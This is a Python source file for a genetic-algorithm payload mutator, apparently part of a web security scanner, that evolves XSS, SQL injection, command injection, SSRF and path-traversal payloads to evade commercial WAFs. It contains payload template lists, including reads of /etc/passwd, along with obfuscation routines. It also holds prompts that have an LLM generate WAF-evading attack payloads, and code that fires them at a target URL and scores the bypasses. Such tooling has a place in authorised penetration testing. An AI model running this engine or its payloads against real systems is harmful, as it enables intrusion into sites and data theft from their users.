"""Genetic payload mutation engine for creative fuzzing and WAF bypass.

Evolves payloads across generations using genetic algorithm concepts:
crossover, mutation, novelty injection, and fitness-based selection.
"""

from __future__ import annotations

import hashlib
import json
import logging
import random
import re
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import httpx

from src.core.exceptions import LLMError

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class Gene:
    """A single payload gene -- an encodable, mutable unit."""

    payload: str
    vuln_class: str
    context: str  # e.g., "reflected_xss", "error_based_sqli"
    obfuscation: str = "none"  # none, case_mutation, comment_injection, encoding, whitespace
    fitness_score: float = 0.0
    generation: int = 0
    success_count: int = 0
    total_attempts: int = 0

    @property
    def gene_id(self) -> str:
        return hashlib.sha256(f"{self.payload}:{self.vuln_class}".encode()).hexdigest()[:12]

    @property
    def success_rate(self) -> float:
        return self.success_count / max(self.total_attempts, 1)


@dataclass
class MutationResult:
    """Result of a mutation generation run."""

    generation: int
    genes: list[Gene]
    best_fitness: float
    novel_count: int  # genes not in seed set


# ---------------------------------------------------------------------------
# LLM prompt templates
# ---------------------------------------------------------------------------

_NOVELTY_PROMPT = """You are an expert offensive security researcher.
Generate ONE novel payload for the vulnerability class: {vuln_class}
Context: {context}

Requirements:
- The payload must be different from common/known payloads
- It should attempt to bypass modern WAFs (Cloudflare, AWS WAF, ModSecurity)
- Return ONLY the payload string, no explanation
- Keep the payload under 300 characters
- Do NOT use alert(), use a unique marker like 'assurix_mut_{{rand}}' instead
"""

_MUTATION_PROMPT = """You are an expert offensive security researcher.
Given this payload: {original}
Vulnerability class: {vuln_class}
Context: {context}

Create a WAF-evading mutation of this payload. Apply one of these strategies:
- Case mutation (e.g., <ScRiPt>)
- Comment injection (e.g., <img src=x on<!---->error=>)
- Encoding variations (URL double-encode, HTML entities, Unicode)
- Whitespace variation (tabs, newlines between tokens)
- Null byte insertion
- Concatenation tricks (e.g., 'al'+'ert')

Return ONLY the mutated payload string, no explanation.
Keep the payload under 300 characters.
"""

# ---------------------------------------------------------------------------
# WAF bypass obfuscation strategies
# ---------------------------------------------------------------------------

_CASE_MUTATION_WORDS = {
    "script", "img", "svg", "body", "input", "iframe", "div", "onerror",
    "onload", "onfocus", "onclick", "alert", "prompt", "confirm",
    "select", "union", "from", "where", "insert", "update", "delete",
    "drop", "exec", "execute", "sleep", "benchmark", "concat",
}

_COMMENT_INJECTION_PATTERNS = {
    "xss": [
        ("<{tag}", "<{tag}<!---->"),
        ("on{event}=", "on{event}<!---->="),
        ("alert(", "al<!---->ert("),
    ],
    "sqli": [
        ("SELECT", "SEL<!---->ECT"),
        ("UNION", "UNI<!---->ON"),
        ("FROM", "FR<!---->OM"),
        ("WHERE", "WH<!---->ERE"),
        ("AND", "A<!---->ND"),
        ("OR", "O<!---->R"),
    ],
}

_WHITESPACE_CHARS = ["\t", "\n", "\r", "\x0c", "\x0b"]


class PayloadMutator:
    """Genetic payload mutation engine for creative fuzzing."""

    def __init__(self, gene_pool_path: str = "data/artifacts/payload_genes.jsonl") -> None:
        self.gene_pool_path = Path(gene_pool_path)
        self.gene_pool_path.parent.mkdir(parents=True, exist_ok=True)
        self._gene_pool: list[Gene] = []
        self._load_gene_pool()

    # ------------------------------------------------------------------
    # Gene Pool Management
    # ------------------------------------------------------------------

    def _load_gene_pool(self) -> None:
        """Load gene pool from JSONL file."""
        if not self.gene_pool_path.exists():
            logger.info("Gene pool file not found at %s, starting fresh", self.gene_pool_path)
            self._gene_pool = []
            return
        loaded: list[Gene] = []
        try:
            with open(self.gene_pool_path, "r", encoding="utf-8") as fh:
                for line_num, line in enumerate(fh, start=1):
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        data = json.loads(line)
                        gene = Gene(
                            payload=data["payload"],
                            vuln_class=data["vuln_class"],
                            context=data.get("context", "unknown"),
                            obfuscation=data.get("obfuscation", "none"),
                            fitness_score=data.get("fitness_score", 0.0),
                            generation=data.get("generation", 0),
                            success_count=data.get("success_count", 0),
                            total_attempts=data.get("total_attempts", 0),
                        )
                        loaded.append(gene)
                    except (json.JSONDecodeError, KeyError) as exc:
                        logger.warning("Skipping malformed gene pool entry at line %d: %s", line_num, exc)
                        continue
        except OSError as exc:
            logger.error("Failed to read gene pool: %s", exc)
        self._gene_pool = loaded
        logger.info("Loaded %d genes from %s", len(self._gene_pool), self.gene_pool_path)

    def save_gene_pool(self) -> None:
        """Persist gene pool to JSONL file."""
        try:
            with open(self.gene_pool_path, "w", encoding="utf-8") as fh:
                for gene in self._gene_pool:
                    record = {
                        "payload": gene.payload,
                        "vuln_class": gene.vuln_class,
                        "context": gene.context,
                        "obfuscation": gene.obfuscation,
                        "fitness_score": gene.fitness_score,
                        "generation": gene.generation,
                        "success_count": gene.success_count,
                        "total_attempts": gene.total_attempts,
                        "gene_id": gene.gene_id,
                    }
                    fh.write(json.dumps(record) + "\n")
            logger.info("Saved %d genes to %s", len(self._gene_pool), self.gene_pool_path)
        except OSError as exc:
            logger.error("Failed to save gene pool: %s", exc)

    def record_outcome(self, gene: Gene, success: bool, response_code: int = 0, content_length: int = 0) -> Gene:
        """Record the outcome of testing a gene and return an updated gene.

        Creates a new Gene instance with updated success/attempt counters
        and recomputed fitness score.
        """
        new_success = gene.success_count + (1 if success else 0)
        new_total = gene.total_attempts + 1
        updated = Gene(
            payload=gene.payload,
            vuln_class=gene.vuln_class,
            context=gene.context,
            obfuscation=gene.obfuscation,
            fitness_score=0.0,  # recomputed below
            generation=gene.generation,
            success_count=new_success,
            total_attempts=new_total,
        )
        updated = Gene(
            payload=updated.payload,
            vuln_class=updated.vuln_class,
            context=updated.context,
            obfuscation=updated.obfuscation,
            fitness_score=self.compute_fitness(updated),
            generation=updated.generation,
            success_count=updated.success_count,
            total_attempts=updated.total_attempts,
        )

        # Update or add in pool
        existing_idx = None
        for idx, existing in enumerate(self._gene_pool):
            if existing.gene_id == updated.gene_id:
                existing_idx = idx
                break
        if existing_idx is not None:
            self._gene_pool[existing_idx] = updated
        else:
            self._gene_pool.append(updated)

        return updated

    # ------------------------------------------------------------------
    # Genetic Operators
    # ------------------------------------------------------------------

    def crossover(self, parent_a: Gene, parent_b: Gene) -> Gene:
        """Combine structural elements from two successful payloads.

        Splits payloads at injection points and recombines them to
        produce a child gene.
        """
        payload_a = parent_a.payload
        payload_b = parent_b.payload

        # Determine crossover strategy based on vuln class
        vuln_class = parent_a.vuln_class

        if vuln_class == "xss":
            child_payload = self._crossover_xss(payload_a, payload_b)
        elif vuln_class == "sqli":
            child_payload = self._crossover_sqli(payload_a, payload_b)
        elif vuln_class == "cmdi":
            child_payload = self._crossover_cmdi(payload_a, payload_b)
        else:
            child_payload = self._crossover_generic(payload_a, payload_b)

        return Gene(
            payload=child_payload,
            vuln_class=vuln_class,
            context=parent_a.context,
            obfuscation="crossover",
            fitness_score=0.0,
            generation=max(parent_a.generation, parent_b.generation) + 1,
            success_count=0,
            total_attempts=0,
        )

    def _crossover_xss(self, a: str, b: str) -> str:
        """XSS-specific crossover: swap tag names and event handlers."""
        # Extract tag and event from each parent
        tag_pattern = re.compile(r"<(\w+)")
        event_pattern = re.compile(r"(on\w+)=")

        tags_a = tag_pattern.findall(a)
        tags_b = tag_pattern.findall(b)
        events_a = event_pattern.findall(a)
        events_b = event_pattern.findall(b)

        if tags_a and events_b:
            # Swap: tag from a, event handler from b
            result = a
            if tags_b:
                result = result.replace(tags_a[0], tags_b[0], 1)
            if events_b:
                for ev_a in events_a[:1]:
                    for ev_b in events_b[:1]:
                        result = result.replace(ev_a, ev_b, 1)
            return result

        # Fallback: simple midpoint split
        return self._crossover_generic(a, b)

    def _crossover_sqli(self, a: str, b: str) -> str:
        """SQLi-specific crossover: swap injection clauses."""
        keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "ORDER BY", "GROUP BY"]

        # Try to find a split point at a SQL keyword
        for kw in keywords:
            kw_upper = kw.upper()
            if kw_upper in a.upper():
                idx = a.upper().find(kw_upper)
                prefix = a[:idx]
                suffix = b[b.upper().find(kw_upper) + len(kw):] if kw_upper in b.upper() else b
                return prefix + kw + " " + suffix.lstrip()

        return self._crossover_generic(a, b)

    def _crossover_cmdi(self, a: str, b: str) -> str:
        """Command injection crossover: swap command prefixes."""
        separators = [";", "|", "&&", "||", "`", "$("]
        for sep in separators:
            if sep in a:
                prefix = a.split(sep)[0] + sep
                if sep in b:
                    suffix = sep.join(b.split(sep)[1:])
                    return prefix + " " + suffix.lstrip()
                return prefix + " " + b.lstrip()

        return self._crossover_generic(a, b)

    def _crossover_generic(self, a: str, b: str) -> str:
        """Generic crossover: split at midpoint and combine halves."""
        mid_a = len(a) // 2
        mid_b = len(b) // 2
        return a[:mid_a] + b[mid_b:]

    def mutate(self, gene: Gene, llm_client: Any | None = None) -> Gene:
        """Apply semantic mutations: encoding changes, case mutation, comment injection, etc.

        Tries multiple mutation strategies and returns one randomly
        selected result. If an LLM client is provided, also attempts
        LLM-guided mutation.
        """
        vuln_class = gene.vuln_class
        strategies = ["case_mutation", "comment_injection", "encoding", "whitespace", "null_byte"]
        # Weight strategies by relevance to the vuln class
        if vuln_class == "xss":
            strategies.extend(["case_mutation", "comment_injection", "encoding", "encoding"])
        elif vuln_class == "sqli":
            strategies.extend(["comment_injection", "whitespace", "null_byte", "encoding"])
        elif vuln_class == "cmdi":
            strategies.extend(["whitespace", "null_byte", "encoding"])

        strategy = random.choice(strategies)
        mutated_payload = self._apply_strategy(strategy, gene.payload, vuln_class)

        # Optionally use LLM for more creative mutation
        if llm_client is not None and random.random() < 0.3:
            try:
                llm_payload = self._llm_mutate(gene, llm_client)
                if llm_payload:
                    mutated_payload = llm_payload
                    strategy = "llm_mutation"
            except (LLMError, Exception) as exc:
                logger.warning("LLM mutation failed, using local strategy: %s", exc)

        return Gene(
            payload=mutated_payload,
            vuln_class=gene.vuln_class,
            context=gene.context,
            obfuscation=strategy,
            fitness_score=0.0,
            generation=gene.generation + 1,
            success_count=0,
            total_attempts=0,
        )

    def _apply_strategy(self, strategy: str, payload: str, vuln_class: str) -> str:
        """Apply a single mutation strategy to a payload."""
        if strategy == "case_mutation":
            return self.apply_case_mutation(payload)
        elif strategy == "comment_injection":
            return self.apply_comment_injection(payload)
        elif strategy == "encoding":
            return self.apply_encoding(payload)
        elif strategy == "whitespace":
            return self.apply_whitespace_variation(payload)
        elif strategy == "null_byte":
            return self.apply_null_byte(payload)
        elif strategy == "llm_mutation":
            return payload  # handled externally
        return payload

    async def inject_novelty(self, vuln_class: str, llm_client: Any | None = None) -> Gene:
        """Use LLM to generate a completely novel payload for a vulnerability class.

        Falls back to a template-based approach when no LLM client is
        available.
        """
        if llm_client is None:
            return self._template_novelty(vuln_class)

        prompt = _NOVELTY_PROMPT.format(
            vuln_class=vuln_class,
            context="WAF bypass",
            rand=random.randint(1000, 9999),
        )
        try:
            result = await llm_client.generate(prompt, task_type="exploitation")
            payload = result.strip().strip("'\"`")
            if len(payload) > 300 or not payload:
                logger.warning("LLM novelty payload invalid (len=%d), using template", len(payload))
                return self._template_novelty(vuln_class)
            return Gene(
                payload=payload,
                vuln_class=vuln_class,
                context="llm_novelty",
                obfuscation="llm_novelty",
                fitness_score=0.0,
                generation=0,
                success_count=0,
                total_attempts=0,
            )
        except (LLMError, Exception) as exc:
            logger.warning("LLM novelty generation failed: %s", exc)
            return self._template_novelty(vuln_class)

    def _template_novelty(self, vuln_class: str) -> Gene:
        """Generate a novel payload from templates when LLM is unavailable."""
        marker = f"assurix_mut_{random.randint(1000, 9999)}"
        templates: dict[str, list[str]] = {
            "xss": [
                f"<details/open/ontoggle={marker}>",
                f"<math><mtext><table><mglyph><style><!--</style><img src={marker}>",
                f"<svg><animate onbegin={marker} attributeName=x>",
                f"<input autofocus onfocus={marker}>",
                f"<marquee onstart={marker}>",
                f"<isindex action=javascript:{marker}>",
                f"<object data=javascript:{marker}>",
            ],
            "sqli": [
                f"' OR 1=1-- -",
                f"') OR ('1'='1'-- -",
                f"1' ORDER BY 1-- -",
                f"1' GROUP BY 1-- -",
                f"'; WAITFOR DELAY '0:0:3'-- -",
                f"' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -",
            ],
            "cmdi": [
                f"; echo {marker}",
                f"| echo {marker}",
                f"$({marker})",
                f"`echo {marker}`",
                f"& echo {marker}",
            ],
            "ssrf": [
                "http://0x7f000001",
                "http://0177.0.0.1",
                "http://[::ffff:127.0.0.1]",
                "http://localtest.me",
                "http://127.1",
            ],
            "path_traversal": [
                "....//....//....//etc/passwd",
                "..%252f..%252f..%252fetc/passwd",
                "/proc/self/environ",
                "..%c0%af..%c0%af..%c0%afetc/passwd",
            ],
        }
        pool = templates.get(vuln_class, templates["xss"])
        payload = random.choice(pool)
        return Gene(
            payload=payload,
            vuln_class=vuln_class,
            context="template_novelty",
            obfuscation="template",
            fitness_score=0.0,
            generation=0,
            success_count=0,
            total_attempts=0,
        )

    def _llm_mutate(self, gene: Gene, llm_client: Any) -> str | None:
        """Synchronous LLM mutation helper (used by mutate)."""
        import asyncio

        prompt = _MUTATION_PROMPT.format(
            original=gene.payload,
            vuln_class=gene.vuln_class,
            context=gene.context,
        )
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                # Cannot await from within a running loop; schedule and skip
                return None
            result = loop.run_until_complete(llm_client.generate(prompt, task_type="exploitation"))
            payload = result.strip().strip("'\"`")
            if len(payload) > 300 or not payload:
                return None
            return payload
        except RuntimeError:
            return None

    # ------------------------------------------------------------------
    # WAF Evasion Techniques
    # ------------------------------------------------------------------

    def apply_case_mutation(self, payload: str) -> str:
        """<ScRiPt> style case mutation for WAF bypass."""
        result = []
        toggle = False
        for char in payload:
            if char.isalpha() and char.lower() in {c.lower() for c in "abcdefghijklmnopqrstuvwxyz"}:
                # Toggle case for known trigger words
                if any(w in payload.lower() for w in _CASE_MUTATION_WORDS):
                    if toggle:
                        result.append(char.upper())
                    else:
                        result.append(char.lower())
                    toggle = not toggle
                else:
                    result.append(char)
            else:
                result.append(char)
        return "".join(result)

    def apply_comment_injection(self, payload: str) -> str:
        """Inject SQL/XSS comments: <img src=x on<!---->error=> style."""
        result = payload

        # XSS comment injection
        for tag in ["script", "img", "svg", "iframe", "body", "input"]:
            pattern = f"<{tag}"
            if pattern in result.lower():
                idx = result.lower().find(pattern)
                tag_text = result[idx: idx + len(tag) + 1]
                result = result[:idx] + tag_text[:2] + "<!---->" + tag_text[2:] + result[idx + len(tag) + 1:]
                break

        # Event handler comment injection
        for event in ["onerror", "onload", "onfocus", "onclick", "ontoggle", "onmouseover"]:
            if event in result.lower():
                idx = result.lower().find(event)
                event_text = result[idx: idx + len(event)]
                mid = len(event) // 2
                result = result[:idx] + event_text[:mid] + "<!---->" + event_text[mid:] + result[idx + len(event):]
                break

        # SQL comment injection
        for kw in ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]:
            if kw in result.upper():
                idx = result.upper().find(kw)
                original = result[idx: idx + len(kw)]
                mid = len(kw) // 2
                result = result[:idx] + original[:mid] + "/**/" + original[mid:] + result[idx + len(kw):]
                break

        return result

    def apply_encoding(self, payload: str) -> str:
        """URL encode, double encode, HTML entity encode."""
        strategy = random.choice(["url_encode", "double_url_encode", "html_entity", "unicode"])

        if strategy == "url_encode":
            return urllib.parse.quote(payload, safe=":/?=&")
        elif strategy == "double_url_encode":
            single = urllib.parse.quote(payload, safe=":/?=&")
            return urllib.parse.quote(single, safe="")
        elif strategy == "html_entity":
            return "".join(f"&#{ord(c)};" for c in payload)
        elif strategy == "unicode":
            return "".join(f"\\u{ord(c):04x}" if ord(c) > 127 else c for c in payload)
        return payload

    def apply_whitespace_variation(self, payload: str) -> str:
        """Tab, newline, carriage return insertion."""
        # Replace spaces with random whitespace characters
        result = payload.replace(" ", random.choice(_WHITESPACE_CHARS + [" "]))
        # Also try inserting whitespace inside HTML tags
        for tag in ["script", "img", "svg"]:
            close_tag = f"</{tag}>"
            if close_tag in result.lower():
                idx = result.lower().find(close_tag)
                result = result[:idx + 2] + random.choice(_WHITESPACE_CHARS) + result[idx + 2:]
                break
        return result

    def apply_null_byte(self, payload: str) -> str:
        """Insert null bytes to bypass filters that stop at \\x00."""
        # Insert null byte before SQL keywords
        for kw in ["UNION", "SELECT", "FROM", "WHERE"]:
            if kw in payload.upper():
                idx = payload.upper().find(kw)
                return payload[:idx] + "%00" + payload[idx:]
        # Insert null byte inside HTML tags
        for tag in ["script", "img", "svg"]:
            open_tag = f"<{tag}"
            if open_tag in payload.lower():
                idx = payload.lower().find(open_tag)
                return payload[:idx + 1] + "%00" + payload[idx + 1:]
        return payload

    # ------------------------------------------------------------------
    # Fitness Evaluation
    # ------------------------------------------------------------------

    def compute_fitness(self, gene: Gene) -> float:
        """Success rate + uniqueness bonus + WAF bypass score.

        Fitness = success_rate * 0.6 + uniqueness * 0.4
        """
        success_rate = gene.success_count / max(gene.total_attempts, 1)
        uniqueness = self._uniqueness_score(gene)
        return success_rate * 0.6 + uniqueness * 0.4

    def _uniqueness_score(self, gene: Gene) -> float:
        """How different is this gene from others in the pool?

        Uses Jaccard distance on character n-grams between the gene
        payload and all pool payloads of the same vuln class.
        """
        same_class = [g for g in self._gene_pool if g.vuln_class == gene.vuln_class and g.gene_id != gene.gene_id]
        if not same_class:
            return 1.0  # Unique in its class

        gene_ngrams = self._char_ngrams(gene.payload, 3)
        if not gene_ngrams:
            return 0.5

        min_similarity = 1.0
        for other in same_class:
            other_ngrams = self._char_ngrams(other.payload, 3)
            if not other_ngrams:
                continue
            intersection = gene_ngrams & other_ngrams
            union = gene_ngrams | other_ngrams
            similarity = len(intersection) / max(len(union), 1)
            min_similarity = min(min_similarity, similarity)

        return 1.0 - min_similarity  # Convert similarity to distance

    @staticmethod
    def _char_ngrams(text: str, n: int = 3) -> set[str]:
        """Extract character n-grams from text."""
        return {text[i: i + n] for i in range(len(text) - n + 1)}

    def _waf_bypass_score(self, response_code: int, content_length: int, baseline_length: int) -> float:
        """Score based on response anomalies that suggest WAF evasion.

        A successful WAF bypass often produces:
        - 200 status (not 403/406 which WAFs return)
        - Response body different from WAF block pages
        - Content length significantly different from baseline
        """
        score = 0.0
        # 200 = got through, 403 = blocked, 406 = not acceptable
        if response_code == 200:
            score += 0.4
        elif response_code in (403, 406, 429):
            score -= 0.3
        # Content length anomaly
        if baseline_length > 0:
            ratio = abs(content_length - baseline_length) / max(baseline_length, 1)
            if ratio > 0.3:
                score += 0.3  # Significant difference from baseline
            elif ratio < 0.05:
                score -= 0.1  # Nearly identical (probably WAF block page)
        # Non-standard response codes that might indicate partial bypass
        if response_code in (301, 302, 307, 308):
            score += 0.1
        return max(score, 0.0)

    # ------------------------------------------------------------------
    # Evolution Loop
    # ------------------------------------------------------------------

    async def evolve(
        self,
        vuln_class: str,
        seed_payloads: list[str],
        generations: int = 3,
        population_size: int = 10,
        llm_client: Any | None = None,
        target_url: str = "",
        http_client: httpx.AsyncClient | None = None,
    ) -> MutationResult:
        """Run genetic evolution for a vulnerability class.

        For each generation:
        1. Seed from initial payloads + gene pool
        2. Apply crossover and mutation
        3. Test against target (if provided)
        4. Score fitness
        5. Select top performers
        6. Feed winners into next generation
        """
        logger.info(
            "Starting evolution: vuln_class=%s, seeds=%d, generations=%d, pop=%d",
            vuln_class, len(seed_payloads), generations, population_size,
        )

        # Step 1: Build initial population from seeds + gene pool
        population: list[Gene] = []

        # Add seed payloads as genes
        for payload in seed_payloads:
            gene = Gene(
                payload=payload,
                vuln_class=vuln_class,
                context="seed",
                obfuscation="none",
                fitness_score=0.0,
                generation=0,
                success_count=0,
                total_attempts=0,
            )
            population.append(gene)

        # Add relevant genes from pool
        pool_genes = [g for g in self._gene_pool if g.vuln_class == vuln_class]
        population.extend(pool_genes[:population_size])

        # Deduplicate by gene_id
        seen_ids: set[str] = set()
        unique_population: list[Gene] = []
        for gene in population:
            if gene.gene_id not in seen_ids:
                seen_ids.add(gene.gene_id)
                unique_population.append(gene)
        population = unique_population

        seed_ids = {g.gene_id for g in population}

        best_overall_fitness = 0.0

        for gen in range(1, generations + 1):
            logger.info("Evolution generation %d/%d for %s (pop=%d)", gen, generations, vuln_class, len(population))

            # Step 2: Apply crossover and mutation
            offspring: list[Gene] = []

            # Crossover: pair top performers
            if len(population) >= 2:
                parents = sorted(population, key=lambda g: g.fitness_score, reverse=True)[:4]
                for i in range(0, len(parents) - 1, 2):
                    child = self.crossover(parents[i], parents[i + 1])
                    offspring.append(child)

            # Mutation: mutate random individuals
            mutation_count = max(2, population_size // 3)
            for gene in random.sample(population, min(mutation_count, len(population))):
                mutant = self.mutate(gene, llm_client=None)  # Sync mutation only
                offspring.append(mutant)

            # LLM novelty injection (async)
            if llm_client is not None and gen > 1:
                try:
                    novel = await self.inject_novelty(vuln_class, llm_client)
                    offspring.append(novel)
                except (LLMError, Exception) as exc:
                    logger.warning("Novelty injection failed in generation %d: %s", gen, exc)

            # Step 3: Test against target if provided
            if target_url and http_client:
                offspring = await self._test_population(offspring, target_url, http_client)

            # Step 4: Score fitness for new offspring without scores
            scored_offspring: list[Gene] = []
            for gene in offspring:
                if gene.fitness_score == 0.0 and gene.total_attempts > 0:
                    score = self.compute_fitness(gene)
                    gene = Gene(
                        payload=gene.payload,
                        vuln_class=gene.vuln_class,
                        context=gene.context,
                        obfuscation=gene.obfuscation,
                        fitness_score=score,
                        generation=gene.generation,
                        success_count=gene.success_count,
                        total_attempts=gene.total_attempts,
                    )
                scored_offspring.append(gene)

            # Step 5: Merge and select top performers
            merged = population + scored_offspring
            merged.sort(key=lambda g: g.fitness_score, reverse=True)
            population = merged[:population_size]

            # Track best fitness
            if population:
                best_overall_fitness = max(best_overall_fitness, population[0].fitness_score)

            logger.info(
                "Generation %d complete: pop=%d, best_fitness=%.3f",
                gen, len(population), best_overall_fitness,
            )

        # Count novel genes (not in original seed set)
        novel_count = sum(1 for g in population if g.gene_id not in seed_ids)

        # Update gene pool with evolved genes
        for gene in population:
            existing_idx = None
            for idx, existing in enumerate(self._gene_pool):
                if existing.gene_id == gene.gene_id:
                    existing_idx = idx
                    break
            if existing_idx is not None:
                self._gene_pool[existing_idx] = gene
            else:
                self._gene_pool.append(gene)

        self.save_gene_pool()

        result = MutationResult(
            generation=generations,
            genes=population,
            best_fitness=best_overall_fitness,
            novel_count=novel_count,
        )
        logger.info(
            "Evolution complete for %s: %d genes, best_fitness=%.3f, %d novel",
            vuln_class, len(population), best_overall_fitness, novel_count,
        )
        return result

    async def _test_population(
        self,
        genes: list[Gene],
        target_url: str,
        client: httpx.AsyncClient,
    ) -> list[Gene]:
        """Test a population of genes against a target URL.

        Sends each payload as a query parameter and records the outcome.
        """
        from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

        tested: list[Gene] = []
        baseline_len = 0

        # Get baseline response
        try:
            baseline_resp = await client.get(target_url, timeout=10.0, follow_redirects=False)
            if baseline_resp:
                baseline_len = len(baseline_resp.text)
        except (httpx.HTTPError, Exception):
            logger.warning("Baseline request failed for %s", target_url)

        for gene in genes:
            parsed = urlparse(target_url)
            qs = parse_qs(parsed.query)
            # Use common parameter names based on vuln class
            param_name = self._select_param(gene.vuln_class)
            qs[param_name] = [gene.payload]

            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(qs, doseq=True), parsed.fragment,
            ))

            success = False
            response_code = 0
            content_length = 0

            try:
                resp = await client.get(test_url, timeout=10.0, follow_redirects=False)
                if resp:
                    response_code = resp.status_code
                    content_length = len(resp.text)
                    # Heuristic: check if payload was reflected or triggered
                    success = self._check_success(gene, resp.text, response_code, baseline_len)
            except (httpx.HTTPError, Exception):
                pass

            updated = self.record_outcome(gene, success, response_code, content_length)

            # Add WAF bypass score to fitness
            waf_score = self._waf_bypass_score(response_code, content_length, baseline_len)
            if waf_score > 0:
                updated = Gene(
                    payload=updated.payload,
                    vuln_class=updated.vuln_class,
                    context=updated.context,
                    obfuscation=updated.obfuscation,
                    fitness_score=updated.fitness_score + waf_score * 0.2,
                    generation=updated.generation,
                    success_count=updated.success_count,
                    total_attempts=updated.total_attempts,
                )

            tested.append(updated)

        return tested

    @staticmethod
    def _select_param(vuln_class: str) -> str:
        """Select a likely parameter name for a given vulnerability class."""
        param_map = {
            "xss": "q",
            "sqli": "id",
            "cmdi": "cmd",
            "ssrf": "url",
            "path_traversal": "file",
            "ssti": "template",
            "xxe": "xml",
            "ldap": "username",
        }
        return param_map.get(vuln_class, "q")

    @staticmethod
    def _check_success(gene: Gene, response_body: str, status_code: int, baseline_len: int) -> bool:
        """Heuristic check if a payload was successful against a target."""
        body_lower = response_body.lower()

        if gene.vuln_class == "xss":
            # Check if XSS payload is reflected
            if gene.payload.lower() in body_lower:
                return True
            if "assurix_mut_" in body_lower or "assurix_xss" in body_lower:
                return True
            # Check for unreflected but unfiltered
            if status_code == 200 and "<script>" in gene.payload.lower():
                stripped = gene.payload.lower().replace(" ", "").replace("\t", "").replace("\n", "")
                if stripped in body_lower.replace(" ", "").replace("\t", "").replace("\n", ""):
                    return True

        elif gene.vuln_class == "sqli":
            # Check for SQL error patterns
            sql_errors = [
                "sql syntax", "mysql", "postgresql", "sqlite",
                "ora-", "odbc", "sqlstate", "unclosed quotation",
            ]
            if any(err in body_lower for err in sql_errors):
                return True
            # Check for differential response
            if baseline_len > 0 and abs(len(response_body) - baseline_len) > baseline_len * 0.3:
                return True

        elif gene.vuln_class == "cmdi":
            if "assurix_cmdi" in body_lower or "uid=" in body_lower:
                return True

        elif gene.vuln_class == "ssrf":
            metadata_markers = ["ami-id", "instance-id", "meta-data", "computeMetadata"]
            if any(m in body_lower for m in metadata_markers):
                return True

        # Generic: significant response difference
        if baseline_len > 0 and abs(len(response_body) - baseline_len) > baseline_len * 0.5:
            return True

        return False

    # ------------------------------------------------------------------
    # Utility
    # ------------------------------------------------------------------

    def get_pool_for_class(self, vuln_class: str) -> list[Gene]:
        """Return genes from the pool matching a vulnerability class."""
        return [g for g in self._gene_pool if g.vuln_class == vuln_class]

    def get_top_genes(self, vuln_class: str, limit: int = 10) -> list[Gene]:
        """Return top-scoring genes for a vulnerability class."""
        class_genes = self.get_pool_for_class(vuln_class)
        class_genes.sort(key=lambda g: g.fitness_score, reverse=True)
        return class_genes[:limit]

    @property
    def pool_size(self) -> int:
        """Number of genes in the pool."""
        return len(self._gene_pool)